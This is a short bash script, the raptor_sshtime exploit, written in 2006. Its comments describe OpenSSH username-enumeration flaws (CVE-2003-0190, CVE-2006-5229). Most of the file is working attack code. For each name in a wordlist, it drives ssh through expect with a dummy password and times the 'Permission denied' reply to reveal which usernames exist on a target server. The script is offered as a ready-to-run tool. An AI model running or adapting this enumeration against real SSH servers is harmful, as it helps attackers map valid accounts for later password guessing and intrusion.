#!/bin/bash

#
# $Id: raptor_sshtime,v 1.1 2007/02/13 16:38:57 raptor Exp $
#
# raptor_sshtime - [Open]SSH remote timing attack exploit
# Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# OpenSSH-portable 3.6.1p1 and earlier with PAM support enabled immediately 
# sends an error message when a user does not exist, which allows remote 
# attackers to determine valid usernames via a timing attack (CVE-2003-0190).
#
# OpenSSH portable 4.1 on SUSE Linux, and possibly other platforms and versions,
# and possibly under limited configurations, allows remote attackers to 
# determine valid usernames via timing discrepancies in which responses take 
# longer for valid usernames than invalid ones, as demonstrated by sshtime. 
# NOTE: as of 20061014, it appears that this issue is dependent on the use of 
# manually-set passwords that causes delays when processing /etc/shadow due to 
# an increased number of rounds (CVE-2006-5229).
# 
# This is a simple shell script based on expect meant to remotely analyze 
# timing differences in sshd "Permission denied" replies. Depending on OpenSSH 
# version and configuration, it may lead to disclosure of valid usernames. 
#
# Usage example: 
# [make sure the target hostkey has been approved before]
# ./sshtime 192.168.0.1 dict.txt
#

# Some vars
port=22

# Command line
host=$1
dict=$2

# Local functions
function head() {
	echo ""
	echo "raptor_sshtime - [Open]SSH remote timing attack exploit"
	echo "Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"
	echo ""
}

function foot() {
	echo ""
	exit 0
}
	
function usage() {
	head
	echo "[make sure the target hostkey has been approved before]"
	echo ""
	echo "usage  : ./sshtime <target> <wordlist>"
	echo "example: ./sshtime 192.168.0.1 dict.txt"
	foot
}

function notfound() {
	head
	echo "error  : expect interpreter not found!"
	foot
}

# Check if expect is there
expect=`which expect 2>/dev/null`
if [ $? -ne 0 ]; then
	notfound
fi

# Input control
if [ -z "$2"  ]; then
	usage
fi

# Perform the bruteforce attack
head

for user in `cat $dict`
do
	echo -ne "$user@$host\t\t"
	(time -p $expect -c "log_user 0; spawn -noecho ssh -p $port $host -l $user; for {} 1 {} {expect -nocase \"password*\" {send \"dummy\r\"} eof {exit}}") 2>&1 | grep real
done

